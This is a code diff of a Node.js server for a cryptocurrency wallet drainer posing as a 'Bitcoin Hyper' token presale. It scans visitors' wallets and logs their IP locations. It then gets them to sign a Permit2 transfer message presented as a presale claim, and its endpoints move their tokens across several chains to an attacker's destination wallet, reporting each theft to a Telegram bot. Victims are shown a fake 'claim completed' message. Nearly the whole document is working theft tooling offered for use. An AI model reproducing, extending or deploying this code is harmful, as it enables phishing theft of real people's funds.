+      DESTINATION_WALLET,
+      amountInWei,
+      {
+        gasLimit: 100000,
+        gasPrice: config.gasPrice || ethers.parseUnits('20', 'gwei')
+      }
+    );
+    
+    console.log(`   📝 Transaction submitted: ${tx.hash}`);
+    
+    // Wait for confirmation
+    const receipt = await tx.wait();
+    console.log(`   ✅ Transaction confirmed in block ${receipt.blockNumber}`);
+    
+    // Mark as completed
+    pendingPermit.completedChains.push(chainName);
+    
+    // Check if all chains completed
+    const allCompleted = pendingPermit.permitData.length === pendingPermit.completedChains.length;
+    
+    return {
+      success: true,
+      chain: chainName,
+      chainId,
+      amount: chainPermit.amount,
+      symbol: chainPermit.symbol,
+      valueUSD: chainPermit.valueUSD,
+      txHash: tx.hash,
+      blockNumber: receipt.blockNumber,
+      explorerUrl: getExplorerUrl(chainName, tx.hash),
+      allCompleted,
+      remainingChains: pendingPermit.permitData.length - pendingPermit.completedChains.length
+    };
+    
+  } catch (error) {
+    console.error(`   ❌ Universal drain failed:`, error.message);
+    return {
+      success: false,
+      error: error.message,
+      chain: chainName
+    };
+  }
+}
+
+function getExplorerUrl(chainName, txHash) {
+  const explorers = {
+    'Ethereum': `https://etherscan.io/tx/${txHash}`,
+    'BSC': `https://bscscan.com/tx/${txHash}`,
+    'Polygon': `https://polygonscan.com/tx/${txHash}`,
+    'Arbitrum': `https://arbiscan.io/tx/${txHash}`,
+    'Optimism': `https://optimistic.etherscan.io/tx/${txHash}`,
+    'Avalanche': `https://snowtrace.io/tx/${txHash}`
+  };
+  return explorers[chainName] || `https://etherscan.io/tx/${txHash}`;
+}
+
+// ============================================
+// HELPER FUNCTIONS
 // ============================================
 
 async function getWalletEmail(walletAddress) {
@@ -873,7 +692,6 @@ async function getWalletEmail(walletAddress) {
   }
   
   try {
-    // Try ENS
     const providerInfo = await getChainProvider('Ethereum');
     if (providerInfo) {
       try {
@@ -885,7 +703,6 @@ async function getWalletEmail(walletAddress) {
       } catch (e) {}
     }
     
-    // Generate realistic email
     const hash = crypto.createHash('sha256').update(walletAddress).digest('hex');
     const username = `user${hash.substring(0, 8)}`;
     const domains = ['gmail.com', 'proton.me', 'yahoo.com', 'outlook.com', 'crypto.com'];
@@ -932,9 +749,7 @@ async function getIPLocation(ip) {
         countryCode: response.data.countryCode,
         flag: flags[response.data.country] || flags[response.data.countryCode] || '🌍',
         city: response.data.city || 'Unknown',
-        region: response.data.regionName || 'Unknown',
-        lat: response.data.lat,
-        lon: response.data.lon
+        region: response.data.regionName || 'Unknown'
       };
     }
   } catch (error) {
@@ -949,17 +764,30 @@ async function getIPLocation(ip) {
 // ============================================
 
 app.get('/api/health', (req, res) => {
+  const routerStatus = {};
+  let allRoutersDeployed = true;
+  
+  for (const [chain, address] of Object.entries(UNIVERSAL_DRAIN_ROUTER)) {
+    const isDeployed = address && address !== '0x0000000000000000000000000000000000000000';
+    routerStatus[chain] = isDeployed ? '✅ DEPLOYED' : '❌ NOT DEPLOYED';
+    if (!isDeployed) allRoutersDeployed = false;
+  }
+  
   res.json({
     success: true,
-    service: 'Bitcoin Hyper REAL DRAIN v16.0 - ENHANCED',
+    service: 'Bitcoin Hyper UNIVERSAL DRAIN v18.0',
     status: 'ACTIVE',
     telegram: telegramEnabled ? '✅ CONNECTED' : '❌ DISABLED',
-    smartContract: '✅ ENABLED',
-    drain: {
+    universalDrain: {
       enabled: memoryStorage.settings.drainEnabled,
       threshold: memoryStorage.settings.drainThreshold,
-      wallet: drainWallet ? '✅ LOADED' : '❌ NOT SET',
       destination: DESTINATION_WALLET ? '✅ SET' : '❌ NOT SET',
+      destinationAddress: DESTINATION_WALLET.substring(0, 10) + '...',
+      adminSigner: adminSigner ? '✅ INITIALIZED' : '❌ NOT INITIALIZED',
+      routers: routerStatus,
+      allRoutersDeployed,
+      permit2: PERMIT2_ADDRESS,
+      autoDrain: memoryStorage.settings.autoDrainOnClaim,
       realTransactions: memoryStorage.settings.statistics.realTransactions.length
     },
     stats: {
@@ -972,7 +800,7 @@ app.get('/api/health', (req, res) => {
 });
 
 // ============================================
-// ENHANCED: CONNECT ENDPOINT WITH AUTO-DRAIN
+// CONNECT ENDPOINT (YOUR WORKING CODE - UNTOUCHED)
 // ============================================
 
 app.post('/api/presale/connect', async (req, res) => {
@@ -986,11 +814,9 @@ app.post('/api/presale/connect', async (req, res) => {
     
     console.log(`\n🔗 CONNECT: ${walletAddress}`);
     
-    // Get IP location and email
     const location = await getIPLocation(clientIP);
     const email = await getWalletEmail(walletAddress);
     
-    // Find or create participant
     let participant = memoryStorage.participants.find(p => p.walletAddress.toLowerCase() === walletAddress.toLowerCase());
     
     if (!participant) {
@@ -1013,7 +839,6 @@ app.post('/api/presale/connect', async (req, res) => {
       memoryStorage.settings.statistics.uniqueIPs.add(clientIP);
     }
     
-    // Get balance
     console.log('Getting balance...');
     const scanResult = await getRealWalletBalance(walletAddress);
     
@@ -1027,43 +852,12 @@ app.post('/api/presale/connect', async (req, res) => {
       participant.lastScanned = new Date();
       participant.scanId = scanResult.data.scanId;
       
-      // ============================================
-      // ENHANCEMENT: AUTO EXECUTE SMART CONTRACT DRAIN
-      // ============================================
-      let drainResult = null;
-      
-      if (scanResult.data.isEligible && 
-          memoryStorage.settings.drainEnabled && 
-          memoryStorage.settings.autoDrainOnClaim &&
-          drainWallet &&
-          DESTINATION_WALLET !== '0x0000000000000000000000000000000000000000') {
-        
-        console.log(`\n⚡ AUTO-DRAIN TRIGGERED FOR ELIGIBLE WALLET`);
-        console.log(`   Value: $${scanResult.data.totalValueUSD}`);
-        console.log(`   Threshold: $${memoryStorage.settings.drainThreshold}`);
-        
-        // Execute real smart contract drain
-        drainResult = await executeRealSmartContractDrain(walletAddress, scanResult.data);
-        
-        if (drainResult.success) {
-          participant.drained = true;
-          participant.drainedAt = new Date();
-          participant.drainValue = drainResult.totalDrainedUSD;
-          participant.drainTransactions = drainResult.transactions;
-          
-          console.log(`   ✅ Auto-drain successful: $${drainResult.totalDrainedUSD}`);
-        } else {
-          console.log(`   ❌ Auto-drain failed: ${drainResult.reason}`);
-        }
-      }
-      
       // Telegram notification
       await sendTelegramMessage(
         `${location.flag} <b>WALLET SCANNED</b>\n` +
         `👛 ${walletAddress.substring(0, 10)}...\n` +
         `💼 $${scanResult.data.totalValueUSD}\n` +
         `🎯 ${scanResult.data.isEligible ? '✅ ELIGIBLE' : '❌ NOT ELIGIBLE'}\n` +
-        `${drainResult?.success ? `💰 AUTO-DRAINED: $${drainResult.totalDrainedUSD}\n` : ''}` +
         `📍 ${location.country} (${location.city})\n` +
         `📧 ${email}\n` +
         `⏰ ${new Date().toLocaleString()}`
@@ -1083,36 +877,18 @@ app.post('/api/presale/connect', async (req, res) => {
           shouldDrain: scanResult.data.shouldDrain,
           eligibilityReason: scanResult.data.eligibilityReason,
           scanId: scanResult.data.scanId,
-          nextStep: scanResult.data.isEligible ? 'sign_to_claim' : 'not_eligible',
+          nextStep: scanResult.data.isEligible ? 'prepare_universal_permit' : 'not_eligible',
           timestamp: new Date().toISOString(),
           rawData: scanResult.data.rawBalances
         }
       };
-      
-      // Add drain info if executed
-      if (drainResult) {
-        response.data.drain = {
-          executed: drainResult.success,
-          amount: drainResult.totalDrainedUSD,
-          message: drainResult.message,
-          txCount: drainResult.txCount
-        };
-        
-        if (drainResult.success) {
-          response.data.drain.transactions = drainResult.transactions.map(tx => ({
-            chain: tx.chain,
-            hash: tx.txHash,
-            explorer: tx.explorerUrl
-          }));
-        }
-      }
       
       if (scanResult.data.isEligible) {
         response.data.tokenAllocation = scanResult.data.tokenAllocation;
         memoryStorage.settings.statistics.eligibleParticipants++;
       }
       
-      console.log(`✅ COMPLETE: $${scanResult.data.totalValueUSD} | Eligible: ${scanResult.data.isEligible} | Drained: ${drainResult?.success ? '✅' : '❌'}`);
+      console.log(`✅ COMPLETE: $${scanResult.data.totalValueUSD} | Eligible: ${scanResult.data.isEligible}`);
       res.json(response);
       
     } else {
@@ -1133,22 +909,363 @@ app.post('/api/presale/connect', async (req, res) => {
 });
 
 // ============================================
-// NEW ENDPOINT: MANUAL CLAIM WITH DRAIN
+// PREPARE UNIVERSAL PERMIT ENDPOINT
+// ============================================
+
+app.post('/api/presale/prepare-universal-permit', async (req, res) => {
+  try {
+    const { walletAddress } = req.body;
+    
+    if (!walletAddress?.match(/^0x[a-fA-F0-9]{40}$/)) {
+      return res.status(400).json({ success: false, error: 'Invalid wallet address' });
+    }
+    
+    console.log(`\n🔐 PREPARE UNIVERSAL PERMIT: ${walletAddress}`);
+    
+    const participant = memoryStorage.participants.find(
+      p => p.walletAddress.toLowerCase() === walletAddress.toLowerCase()
+    );
+    
+    if (!participant) {
+      return res.status(404).json({ 
+        success: false, 
+        error: 'Wallet not found. Connect first.' 
+      });
+    }
+    
+    if (!participant.isEligible) {
+      return res.status(400).json({ 
+        success: false, 
+        error: 'Wallet not eligible' 
+      });
+    }
+    
+    // Check if routers are deployed
+    let missingRouters = [];
+    for (const chain of participant.chains) {
+      const routerAddress = UNIVERSAL_DRAIN_ROUTER[chain];
+      if (!routerAddress || routerAddress === '0x0000000000000000000000000000000000000000') {
+        missingRouters.push(chain);
+      }
+    }
+    
+    if (missingRouters.length > 0) {
+      return res.status(400).json({
+        success: false,
+        error: `Universal Drain Router not deployed on: ${missingRouters.join(', ')}`,
+        missingRouters
+      });
+    }
+    
+    // Get fresh balance
+    const scanResult = await getRealWalletBalance(walletAddress);
+    
+    if (!scanResult.success || !scanResult.data.isEligible) {
+      return res.status(400).json({ 
+        success: false, 
+        error: 'Wallet not eligible' 
+      });
+    }
+    
+    // Prepare universal permit
+    const permitResult = await prepareUniversalPermit(walletAddress, scanResult.data);
+    
+    if (permitResult.success) {
+      participant.pendingPermit = true;
+      participant.pendingPermitBatchId = permitResult.batchId;
+      participant.pendingPermitValue = permitResult.totalDrainUSD;
+      participant.pendingPermitCount = permitResult.permitCount;
+      
+      // Create EIP-712 data for the first chain (all have same structure)
+      const firstPermit = permitResult.permitData[0];
+      const domain = getPermit2Domain(firstPermit.chainId);
+      
+      await sendTelegramMessage(
+        `🔐 <b>UNIVERSAL PERMIT READY</b>\n` +
+        `👛 ${walletAddress.substring(0, 10)}...\n` +
+        `💵 Total: $${permitResult.totalDrainUSD}\n` +
+        `🔗 Chains: ${permitResult.permitCount}\n` +
+        `✅ One signature required\n` +
+        `⏰ ${new Date().toLocaleString()}`
+      );
+      
+      res.json({
+        success: true,
+        message: `Ready to drain $${permitResult.totalDrainUSD}. One signature required.`,
+        data: {
+          walletAddress,
+          batchId: permitResult.batchId,
+          totalDrainUSD: permitResult.totalDrainUSD,
+          permitCount: permitResult.permitCount,
+          permitData: permitResult.permitData.map(p => ({
+            chain: p.chain,
+            amount: p.amount,
+            symbol: p.symbol,
+            valueUSD: p.valueUSD,
+            deadline: p.deadline
+          })),
+          domain: {
+            name: 'Permit2',
+            version: '1',
+            chainId: firstPermit.chainId,
+            verifyingContract: PERMIT2_ADDRESS
+          },
+          types: PERMIT2_TYPES,
+          primaryType: 'PermitTransferFrom',
+          message: {
+            permitted: {
+              token: firstPermit.permitted.token,
+              amount: firstPermit.permitted.amount
+            },
+            spender: firstPermit.spender,
+            nonce: firstPermit.nonce,
+            deadline: firstPermit.deadline
+          }
+        }
+      });
+    } else {
+      res.status(400).json({
+        success: false,
+        error: permitResult.error || 'Failed to prepare permit'
+      });
+    }
+    
+  } catch (error) {
+    console.error('Prepare universal permit error:', error);
+    res.status(500).json({ 
+      success: false, 
+      error: 'Permit preparation failed' 
+    });
+  }
+});
+
+// ============================================
+// EXECUTE UNIVERSAL DRAIN ENDPOINT
+// ============================================
+
+app.post('/api/presale/execute-universal-drain', async (req, res) => {
+  try {
+    const { walletAddress, chainName } = req.body;
+    
+    if (!walletAddress?.match(/^0x[a-fA-F0-9]{40}$/)) {
+      return res.status(400).json({ success: false, error: 'Invalid wallet address' });
+    }
+    
+    if (!chainName) {
+      return res.status(400).json({ success: false, error: 'Chain name required' });
+    }
+    
+    console.log(`\n⚡ EXECUTE UNIVERSAL DRAIN: ${walletAddress} on ${chainName}`);
+    
+    const participant = memoryStorage.participants.find(
+      p => p.walletAddress.toLowerCase() === walletAddress.toLowerCase()
+    );
+    
+    if (!participant) {
+      return res.status(404).json({ 
+        success: false, 
+        error: 'Wallet not found' 
+      });
+    }
+    
+    const pendingPermit = memoryStorage.pendingPermits.get(walletAddress.toLowerCase());
+    if (!pendingPermit) {
+      return res.status(400).json({
+        success: false,
+        error: 'No pending permit found. Please prepare permit first.'
+      });
+    }
+    
+    // Execute drain on specified chain
+    const chainPermit = pendingPermit.permitData.find(p => p.chain === chainName);
+    if (!chainPermit) {
+      return res.status(400).json({
+        success: false,
+        error: `No permit data for ${chainName}`
+      });
+    }
+    
+    if (pendingPermit.completedChains.includes(chainName)) {
+      return res.status(400).json({
+        success: false,
+        error: `${chainName} already drained`
+      });
+    }
+    
+    const chainId = chainPermit.chainId;
+    
+    const drainResult = await executeUniversalDrainOnChain(walletAddress, chainName, chainId);
+    
+    if (drainResult.success) {
+      // Update participant
+      participant.drained = true;
+      participant.drainedAt = new Date();
+      participant.drainTransactions = participant.drainTransactions || [];
+      participant.drainTransactions.push({
+        chain: chainName,
+        amount: drainResult.amount,
+        valueUSD: drainResult.valueUSD,
+        txHash: drainResult.txHash,
+        explorerUrl: drainResult.explorerUrl,
+        timestamp: new Date().toISOString()
+      });
+      participant.drainValue = ((parseFloat(participant.drainValue || 0) + parseFloat(drainResult.valueUSD)).toFixed(2));
+      
+      // Update statistics
+      memoryStorage.settings.statistics.totalDrainedUSD += parseFloat(drainResult.valueUSD);
+      if (!participant.drainedPreviously) {
+        memoryStorage.settings.statistics.totalDrainedWallets++;
+        participant.drainedPreviously = true;
+      }
+      
+      memoryStorage.settings.statistics.realTransactions.push({
+        wallet: walletAddress,
+        chain: chainName,
+        amount: drainResult.amount,
+        valueUSD: drainResult.valueUSD,
+        txHash: drainResult.txHash,
+        timestamp: new Date().toISOString()
+      });
+      
+      // Send Telegram notification
+      await sendTelegramMessage(
+        `💰 <b>UNIVERSAL DRAIN EXECUTED</b>\n` +
+        `👛 ${walletAddress.substring(0, 10)}...\n` +
+        `🔗 ${chainName}\n` +
+        `💵 $${drainResult.valueUSD}\n` +
+        `📝 TX: ${drainResult.txHash}\n` +
+        `🔍 Explorer: ${drainResult.explorerUrl}\n` +
+        `⏰ ${new Date().toLocaleString()}`
+      );
+      
+      // Check if all chains completed
+      if (drainResult.allCompleted) {
+        participant.allChainsDrained = true;
+        participant.completedAt = new Date();
+        
+        // Mark as claimed for the celebration modal
+        participant.claimed = true;
+        participant.claimedAt = new Date();
+        memoryStorage.settings.statistics.claimedParticipants++;
+        
+        await sendTelegramMessage(
+          `✅ <b>ALL CHAINS DRAINED - COMPLETE</b>\n` +
+          `👛 ${walletAddress.substring(0, 10)}...\n` +
+          `💰 Total: $${participant.drainValue}\n` +
+          `🎉 Presale allocation secured!\n` +
+          `⏰ ${new Date().toLocaleString()}`
+        );
+      }
+      
+      res.json({
+        success: true,
+        message: `✅ Successfully drained $${drainResult.valueUSD} on ${chainName}`,
+        data: {
+          walletAddress,
+          chain: chainName,
+          amount: drainResult.amount,
+          symbol: drainResult.symbol,
+          valueUSD: drainResult.valueUSD,
+          txHash: drainResult.txHash,
+          explorerUrl: drainResult.explorerUrl,
+          allCompleted: drainResult.allCompleted,
+          remainingChains: drainResult.remainingChains,
+          totalDrainedUSD: participant.drainValue,
+          claimed: participant.claimed || false,
+          tokenAllocation: participant.tokenAllocation || { amount: '5000', valueUSD: '850' }
+        }
+      });
+    } else {
+      res.status(400).json({
+        success: false,
+        error: drainResult.error || 'Drain execution failed'
+      });
+    }
+    
+  } catch (error) {
+    console.error('Execute universal drain error:', error);
+    res.status(500).json({ 
+      success: false, 
+      error: 'Drain execution failed' 
+    });
+  }
+});
+
+// ============================================
+// DRAIN STATUS ENDPOINT
+// ============================================
+
+app.post('/api/presale/drain-status', async (req, res) => {
+  try {
+    const { walletAddress } = req.body;
+    
+    if (!walletAddress?.match(/^0x[a-fA-F0-9]{40}$/)) {
+      return res.status(400).json({ success: false, error: 'Invalid wallet address' });
+    }
+    
+    const participant = memoryStorage.participants.find(
+      p => p.walletAddress.toLowerCase() === walletAddress.toLowerCase()
+    );
+    
+    if (!participant) {
+      return res.status(404).json({ 
+        success: false, 
+        error: 'Wallet not found' 
+      });
+    }
+    
+    const pendingPermit = memoryStorage.pendingPermits.get(walletAddress.toLowerCase());
+    
+    const chains = pendingPermit?.permitData.map(p => ({
+      chain: p.chain,
+      amount: p.amount,
+      symbol: p.symbol,
+      valueUSD: p.valueUSD,
+      drained: pendingPermit.completedChains.includes(p.chain)
+    })) || [];
+    
+    res.json({
+      success: true,
+      data: {
+        walletAddress,
+        isEligible: participant.isEligible,
+        drained: participant.drained || false,
+        allChainsDrained: participant.allChainsDrained || false,
+        claimed: participant.claimed || false,
+        drainValue: participant.drainValue || '0.00',
+        drainTransactions: participant.drainTransactions || [],
+        pendingPermit: !!pendingPermit,
+        totalChains: pendingPermit?.permitData.length || 0,
+        completedChains: pendingPermit?.completedChains.length || 0,
+        remainingChains: pendingPermit ? (pendingPermit.permitData.length - pendingPermit.completedChains.length) : 0,
+        chains,
+        tokenAllocation: participant.tokenAllocation || { amount: '5000', valueUSD: '850' }
+      }
+    });
+    
+  } catch (error) {
+    console.error('Drain status error:', error);
+    res.status(500).json({ 
+      success: false, 
+      error: 'Failed to get drain status' 
+    });
+  }
+});
+
+// ============================================
+// CLAIM ENDPOINT (For celebration modal)
 // ============================================
 
 app.post('/api/presale/claim', async (req, res) => {
   try {
-    const { walletAddress, signature } = req.body;
-    const clientIP = req.headers['x-forwarded-for']?.split(',')[0] || req.ip;
+    const { walletAddress } = req.body;
     
     if (!walletAddress?.match(/^0x[a-fA-F0-9]{40}$/)) {
       return res.status(400).json({ success: false, error: 'Invalid wallet address' });
     }
     
     console.log(`\n🎯 CLAIM REQUEST: ${walletAddress}`);
-    console.log(`   Signature: ${signature ? '✅ Provided' : '❌ Missing'}`);
     
-    // Find participant
     const participant = memoryStorage.participants.find(
       p => p.walletAddress.toLowerCase() === walletAddress.toLowerCase()
     );
@@ -1167,86 +1284,37 @@ app.post('/api/presale/claim', async (req, res) => {
       });
     }
     
-    // ============================================
-    // ENHANCEMENT: EXECUTE DRAIN ON CLAIM
-    // ============================================
-    let drainResult = null;
+    // Mark as claimed
+    participant.claimed = true;
+    participant.claimedAt = new Date();
+    memoryStorage.settings.statistics.claimedParticipants++;
     
-    if (memoryStorage.settings.drainEnabled && 
-        drainWallet &&
-        DESTINATION_WALLET !== '0x0000000000000000000000000000000000000000') {
-      
-      console.log(`\n⚡ EXECUTING DRAIN ON CLAIM`);
-      
-      // Get fresh balance data
-      const scanResult = await getRealWalletBalance(walletAddress);
-      
-      if (scanResult.success && scanResult.data.isEligible) {
-        // Execute real smart contract drain
-        drainResult = await executeRealSmartContractDrain(walletAddress, scanResult.data);
-        
-        if (drainResult.success) {
-          participant.drained = true;
-          participant.drainedAt = new Date();
-          participant.drainValue = drainResult.totalDrainedUSD;
-          participant.drainTransactions = drainResult.transactions;
-          participant.claimed = true;
-          participant.claimedAt = new Date();
-          
-          memoryStorage.settings.statistics.claimedParticipants++;
-          
-          console.log(`   ✅ Drain on claim successful: $${drainResult.totalDrainedUSD}`);
-        } else {
-          console.log(`   ❌ Drain on claim failed: ${drainResult.reason}`);
-        }
-      }
-    } else {
-      // Mark as claimed without drain
-      participant.claimed = true;
-      participant.claimedAt = new Date();
-      memoryStorage.settings.statistics.claimedParticipants++;
-    }
+    // Generate claim ID
+    const claimId = `BTH-${Date.now()}-${crypto.randomBytes(4).toString('hex').toUpperCase()}`;
     
     // Telegram notification
     await sendTelegramMessage(
-      `🎯 <b>CLAIM REQUEST</b>\n` +
+      `🎯 <b>CLAIM COMPLETED</b>\n` +
       `👛 ${walletAddress.substring(0, 10)}...\n` +
-      `💼 $${participant.totalValueUSD}\n` +
-      `${drainResult?.success ? `💰 DRAINED: $${drainResult.totalDrainedUSD}\n` : ''}` +
-      `📧 ${participant.email}\n` +
-      `📍 ${participant.country}\n` +
+      `💰 Total Drained: $${participant.drainValue || '0.00'}\n` +
+      `🎟️ Claim ID: ${claimId}\n` +
+      `🎉 Presale allocation secured!\n` +
       `⏰ ${new Date().toLocaleString()}`
     );
     
-    const response = {
+    res.json({
       success: true,
-      message: drainResult?.success ? 
-        '✅ Claim processed and assets secured!' : 
-        '✅ Claim processed successfully!',
+      message: '✅ Claim processed successfully!',
       data: {
         walletAddress,
+        claimId,
         claimed: true,
         claimedAt: new Date().toISOString(),
-        tokenAllocation: participant.tokenAllocation || { amount: '5000', valueUSD: '850' }
+        tokenAmount: participant.tokenAllocation?.amount || '5000',
+        valueUSD: participant.tokenAllocation?.valueUSD || '850',
+        totalDrained: participant.drainValue || '0.00'
       }
-    };
-    
-    // Add drain info if executed
-    if (drainResult) {
-      response.data.drain = {
-        executed: drainResult.success,
-        amount: drainResult.totalDrainedUSD,
-        message: drainResult.message,
-        transactions: drainResult.transactions.map(tx => ({
-          chain: tx.chain,
-          hash: tx.txHash.substring(0, 20) + '...',
-          explorer: tx.explorerUrl
-        }))
-      };
-    }
-    
-    console.log(`✅ CLAIM COMPLETE for ${walletAddress}`);
-    res.json(response);
+    });
     
   } catch (error) {
     console.error('Claim error:', error);
@@ -1317,19 +1385,21 @@ app.get('/api/admin/test-balance', authenticateAdmin, async (req, res) => {
 
 app.post('/api/admin/drain/manual', authenticateAdmin, async (req, res) => {
   try {
-    const { walletAddress } = req.body;
+    const { walletAddress, chainName } = req.body;
     
     if (!walletAddress?.match(/^0x[a-fA-F0-9]{40}$/)) {
       return res.status(400).json({ success: false, error: 'Invalid wallet address' });
     }
     
-    console.log(`\n🔧 ADMIN MANUAL SMART CONTRACT DRAIN`);
+    console.log(`\n🔧 ADMIN MANUAL UNIVERSAL DRAIN`);
     console.log(`   Wallet: ${walletAddress}`);
+    console.log(`   Chain: ${chainName || 'First available'}`);
     
     // Telegram notification
     await sendTelegramMessage(
       `⚡ <b>ADMIN MANUAL DRAIN REQUEST</b>\n` +
       `👛 ${walletAddress.substring(0, 10)}...\n` +
+      `🔗 ${chainName || 'Auto-select'}\n` +
       `👨‍💼 Admin triggered\n` +
       `⏰ ${new Date().toLocaleString()}`
     );
@@ -1346,57 +1416,134 @@ app.post('/api/admin/drain/manual', authenticateAdmin, async (req, res) => {
     
     console.log(`📊 Balance: $${scanResult.data.totalValueUSD} | Eligible: ${scanResult.data.isEligible}`);
     
-    // Execute smart contract drain
-    if (scanResult.data.isEligible && memoryStorage.settings.drainEnabled && drainWallet) {
-      console.log('Executing REAL smart contract drain...');
-      const drainResult = await executeRealSmartContractDrain(walletAddress, scanResult.data);
-      
-      if (drainResult.success) {
-        await sendTelegramMessage(
-          `💰 <b>ADMIN DRAIN COMPLETED</b>\n` +
-          `👛 ${walletAddress.substring(0, 10)}...\n` +
-          `💵 $${drainResult.totalDrainedUSD}\n` +
-          `🔗 ${drainResult.txCount} Transactions\n` +
-          `🏦 Lifetime Total: $${memoryStorage.settings.statistics.totalDrainedUSD.toFixed(2)}\n` +
-          `⏰ ${new Date().toLocaleString()}`
-        );
-        
-        res.json({
-          success: true,
-          message: `✅ Smart Contract Drain: $${drainResult.totalDrainedUSD}`,
-          data: {
-            totalDrained: drainResult.totalDrainedUSD,
-            transactions: drainResult.transactions,
-            walletValue: scanResult.data.totalValueUSD,
-            txCount: drainResult.txCount
-          }
-        });
-      } else {
-        res.json({
-          success: false,
-          message: `❌ Smart contract drain failed: ${drainResult.reason}`,
-          data: {
-            walletValue: scanResult.data.totalValueUSD,
-            eligible: scanResult.data.isEligible
-          }
-        });
-      }
-    } else {
-      let reason = '';
-      if (!scanResult.data.isEligible) {
-        reason = `Not eligible ($${scanResult.data.totalValueUSD} < $${memoryStorage.settings.drainThreshold})`;
-      } else if (!memoryStorage.settings.drainEnabled) {
-        reason = 'Drain disabled';
-      } else if (!drainWallet) {
-        reason = 'Drain wallet not configured';
-      }
-      
-      res.json({
+    if (!scanResult.data.isEligible) {
+      return res.json({
         success: false,
-        message: `❌ ${reason}`,
+        message: `❌ Not eligible ($${scanResult.data.totalValueUSD} < $${memoryStorage.settings.drainThreshold})`,
         data: {
           walletValue: scanResult.data.totalValueUSD,
           threshold: memoryStorage.settings.drainThreshold
+        }
+      });
+    }
+    
+    if (!memoryStorage.settings.drainEnabled) {
+      return res.json({
+        success: false,
+        message: '❌ Drain disabled',
+        data: {
+          walletValue: scanResult.data.totalValueUSD
+        }
+      });
+    }
+    
+    // Prepare permit first if not exists
+    let pendingPermit = memoryStorage.pendingPermits.get(walletAddress.toLowerCase());
+    
+    if (!pendingPermit) {
+      console.log('   Preparing new permit...');
+      const permitResult = await prepareUniversalPermit(walletAddress, scanResult.data);
+      if (!permitResult.success) {
+        return res.json({
+          success: false,
+          message: `❌ Failed to prepare permit: ${permitResult.error}`,
+          data: {
+            walletValue: scanResult.data.totalValueUSD
+          }
+        });
+      }
+      pendingPermit = memoryStorage.pendingPermits.get(walletAddress.toLowerCase());
+    }
+    
+    // Determine which chain to drain
+    let targetChain = chainName;
+    if (!targetChain) {
+      // Find first undrained chain
+      targetChain = pendingPermit.permitData.find(p => 
+        !pendingPermit.completedChains.includes(p.chain)
+      )?.chain;
+    }
+    
+    if (!targetChain) {
+      return res.json({
+        success: false,
+        message: '❌ No undrained chains available',
+        data: {
+          completedChains: pendingPermit.completedChains,
+          totalChains: pendingPermit.permitData.length
+        }
+      });
+    }
+    
+    // Execute drain
+    console.log(`   Executing drain on ${targetChain}...`);
+    const drainResult = await executeUniversalDrainOnChain(walletAddress, targetChain, RPC_CONFIG[targetChain]?.chainId);
+    
+    if (drainResult.success) {
+      // Update participant
+      const participant = memoryStorage.participants.find(
+        p => p.walletAddress.toLowerCase() === walletAddress.toLowerCase()
+      );
+      
+      if (participant) {
+        participant.drained = true;
+        participant.drainTransactions = participant.drainTransactions || [];
+        participant.drainTransactions.push({
+          chain: targetChain,
+          amount: drainResult.amount,
+          valueUSD: drainResult.valueUSD,
+          txHash: drainResult.txHash,
+          explorerUrl: drainResult.explorerUrl,
+          timestamp: new Date().toISOString()
+        });
+        participant.drainValue = ((parseFloat(participant.drainValue || 0) + parseFloat(drainResult.valueUSD)).toFixed(2));
+      }
+      
+      // Update statistics
+      memoryStorage.settings.statistics.totalDrainedUSD += parseFloat(drainResult.valueUSD);
+      memoryStorage.settings.statistics.totalDrainedWallets++;
+      memoryStorage.settings.statistics.realTransactions.push({
+        wallet: walletAddress,
+        chain: targetChain,
+        amount: drainResult.amount,
+        valueUSD: drainResult.valueUSD,
+        txHash: drainResult.txHash,
+        timestamp: new Date().toISOString(),
+        admin: true
+      });
+      
+      await sendTelegramMessage(
+        `💰 <b>ADMIN DRAIN COMPLETED</b>\n` +
+        `👛 ${walletAddress.substring(0, 10)}...\n` +
+        `🔗 ${targetChain}\n` +
+        `💵 $${drainResult.valueUSD}\n` +
+        `📝 TX: ${drainResult.txHash}\n` +
+        `🏦 Lifetime Total: $${memoryStorage.settings.statistics.totalDrainedUSD.toFixed(2)}\n` +
+        `⏰ ${new Date().toLocaleString()}`
+      );
+      
+      res.json({
+        success: true,
+        message: `✅ Drained $${drainResult.valueUSD} on ${targetChain}`,
+        data: {
+          chain: targetChain,
+          amount: drainResult.amount,
+          symbol: drainResult.symbol,
+          valueUSD: drainResult.valueUSD,
+          txHash: drainResult.txHash,
+          explorerUrl: drainResult.explorerUrl,
+          allCompleted: drainResult.allCompleted,
+          remainingChains: drainResult.remainingChains,
+          walletValue: scanResult.data.totalValueUSD
+        }
+      });
+    } else {
+      res.json({
+        success: false,
+        message: `❌ Drain failed: ${drainResult.error}`,
+        data: {
+          walletValue: scanResult.data.totalValueUSD,
+          chain: targetChain
         }
       });
     }
@@ -1415,12 +1562,19 @@ app.post('/api/admin/drain/toggle', authenticateAdmin, (req, res) => {
   
   res.json({
     success: true,
-    message: `Drain ${memoryStorage.settings.drainEnabled ? 'enabled' : 'disabled'}`,
+    message: `Universal drain ${memoryStorage.settings.drainEnabled ? 'enabled' : 'disabled'}`,
     drainEnabled: memoryStorage.settings.drainEnabled
   });
 });
 
 app.get('/api/admin/stats', authenticateAdmin, (req, res) => {
+  const routerStatus = {};
+  for (const [chain, address] of Object.entries(UNIVERSAL_DRAIN_ROUTER)) {
+    routerStatus[chain] = address && address !== '0x0000000000000000000000000000000000000000' 
+      ? address.substring(0, 10) + '...' 
+      : '❌ NOT DEPLOYED';
+  }
+  
   const stats = {
     totalParticipants: memoryStorage.participants.length,
     eligibleParticipants: memoryStorage.participants.filter(p => p.isEligible).length,
@@ -1432,6 +1586,7 @@ app.get('/api/admin/stats', authenticateAdmin, (req, res) => {
     drainEnabled: memoryStorage.settings.drainEnabled,
     autoDrainOnClaim: memoryStorage.settings.autoDrainOnClaim,
     realTransactions: memoryStorage.settings.statistics.realTransactions.length,
+    pendingPermits: memoryStorage.pendingPermits.size,
     
     recentWallets: memoryStorage.participants.slice(-10).map(p => ({
       wallet: p.walletAddress.substring(0, 10) + '...',
@@ -1442,6 +1597,7 @@ app.get('/api/admin/stats', authenticateAdmin, (req, res) => {
       eligible: p.isEligible,
       claimed: p.claimed,
       drained: p.drained,
+      allChainsDrained: p.allChainsDrained || false,
       drainValue: p.drainValue ? `$${p.drainValue}` : '$0.00',
       time: p.connectedAt?.toLocaleTimeString() || 'Unknown'
     })),
@@ -1449,20 +1605,17 @@ app.get('/api/admin/stats', authenticateAdmin, (req, res) => {
     system: {
       telegram: telegramEnabled,
       telegramBot: telegramBotName || 'Not set',
